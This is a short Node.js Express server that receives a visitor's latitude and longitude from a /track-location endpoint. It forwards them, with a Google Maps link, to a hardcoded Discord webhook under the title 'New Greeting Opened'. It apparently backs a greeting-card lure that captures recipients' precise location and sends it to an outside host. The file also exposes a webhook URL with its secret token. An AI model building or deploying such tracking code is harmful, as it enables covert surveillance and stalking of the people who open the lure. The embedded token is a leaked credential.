const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.use(express.json());
app.use(express.static('public')); 

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1456915026114777149/9O263RGwSonMZXTPWWOWnOp6bew0OTy013LQcSbLqDQBe8gwoTsT3sRahzejOkN2cxqY';

app.post('/track-location', async (req, res) => {
    const { latitude, longitude } = req.body;

    if (!latitude || !longitude) {
        return res.status(400).json({ message: 'Missing data' });
    }

    const message = {
        embeds: [{
            title: "📍 New Greeting Opened",
            color: 0x00ff00, // Green color
            fields: [
                { name: "Latitude", value: `${latitude}`, inline: true },
                { name: "Longitude", value: `${longitude}`, inline: true }
            ],
            // FIXED: Standard Google Maps query link
            description: `[View on Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
            footer: { text: "Location captured via User Gesture" },
            timestamp: new Date()
        }]
    };

    try {
        await axios.post(DISCORD_WEBHOOK_URL, message);
        res.status(200).json({ status: 'success' });
    } catch (error) {
        console.error("Discord Error");
        res.status(500).json({ status: 'error' });
    }
});

app.listen(port, () => console.log(`Server: http://localhost:${port}`));